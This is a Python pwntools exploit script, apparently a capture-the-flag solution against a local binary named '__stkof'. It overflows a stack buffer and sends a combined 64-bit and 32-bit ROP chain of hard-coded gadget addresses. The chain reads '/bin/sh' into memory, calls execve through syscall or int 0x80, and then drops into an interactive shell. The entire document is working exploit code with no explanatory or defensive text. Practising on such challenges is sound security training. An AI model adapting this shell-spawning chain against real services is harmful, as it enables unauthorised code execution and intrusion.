from pwn import *
context.log_level='debug'
context.arch='amd64'
p=process('./__stkof')
syscall=0x0000000000461645
rax=0x000000000043b97c
rdi=0x00000000004005f6
rsi=0x0000000000405895
rdx=0x000000000043b9d5
add=0x0806b225
eax=0x080a8af6
dcb=0x0806e9f1
int0x80=0x806f2ff
gdb.attach(p,'')
pay='A'*0x110+p32(add)+p32(0)
pay+=(p64(rax)+p64(0x0)+p64(rsi)+p64(0x0069e200)+p64(rdi)+p64(0)+p64(rdx)+p64(0x200)+p64(syscall)+p64(rax)+p64(0x3b)+p64(rdi)+p64(0x0069e200)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(syscall)).ljust(0x100-4,'\x00')
pay+=p32(dcb)+p32(0x200)+p32(0x080d7200)+p32(0)+p32(eax)+p32(3)+p32(int0x80)+p32(dcb)+p32(0)+p32(0)+p32(0x080d7200)+p32(eax)+p32(0xb)+p32(int0x80)
p.sendafter("?\n",pay.ljust(0x300))

p.send("/bin/sh")
p.interactive('n132>')
